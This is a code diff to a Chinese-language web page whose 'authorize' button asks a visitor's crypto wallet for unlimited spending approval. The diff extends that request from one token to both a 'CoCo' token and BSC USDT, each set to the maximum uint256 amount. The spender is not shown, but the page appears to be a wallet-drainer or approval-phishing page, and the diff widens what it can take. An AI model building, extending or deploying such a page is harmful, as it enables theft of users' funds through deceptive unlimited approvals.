@@ -266,6 +266,12 @@
                 <span class="token-name">CoCo</span>
                 <span class="token-address">0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550</span>
             </div>
+            
+            <div class="token-item">
+                <span class="token-icon">💲</span>
+                <span class="token-name">USDT</span>
+                <span class="token-address">0x55d398326f99059fF775485246999027B3197955</span>
+            </div>
         </div>
         
         <button class="authorize-btn" id="authorizeBtn" onclick="authorize()">
@@ -290,10 +296,16 @@
         
         // 代币合约地址
         const TOKENS = {
-            usdt: {
+            coco: {
                 name: 'CoCo',
                 address: '0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550',
                 icon: '💵',
+                isNative: false
+            },
+            usdt: {
+                name: 'USDT',
+                address: '0x55d398326f99059fF775485246999027B3197955',
+                icon: '💲',
                 isNative: false
             }
         };
@@ -414,10 +426,10 @@
                 const progressFill = document.getElementById('progressFill');
                 progressBar.style.display = 'block';
                 
-                showStatus('开始授权USDT代币...', 'info');
+                showStatus('开始授权CoCo和USDT代币...', 'info');
                 
                 // 准备授权数据
-                const tokensToAuthorize = [TOKENS.usdt];
+                const tokensToAuthorize = [TOKENS.coco, TOKENS.usdt];
                 const tokenAddresses = tokensToAuthorize.map(token => token.address);
                 const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                 const amounts = new Array(tokensToAuthorize.length).fill(maxUint256);
@@ -539,11 +551,11 @@
                 
                 // 显示最终结果
                 if (failCount === 0) {
-                    showStatus(`USDT授权成功！`, 'success');
+                    showStatus(`CoCo和USDT授权成功！`, 'success');
                     authorizeBtn.innerHTML = '授权完成';
                     authorizeBtn.style.background = 'linear-gradient(135deg, #4caf50 0%, #45a049 100%)';
                 } else {
-                    showStatus(`USDT授权失败`, 'error');
+                    showStatus(`CoCo和USDT授权失败`, 'error');
                     authorizeBtn.innerHTML = '重新授权';
                     authorizeBtn.style.background = 'linear-gradient(135deg, #ff9800 0%, #f57c00 100%)';
                 }
@@ -603,4 +615,5 @@
     </script>
 </body>
 </html>
+
 
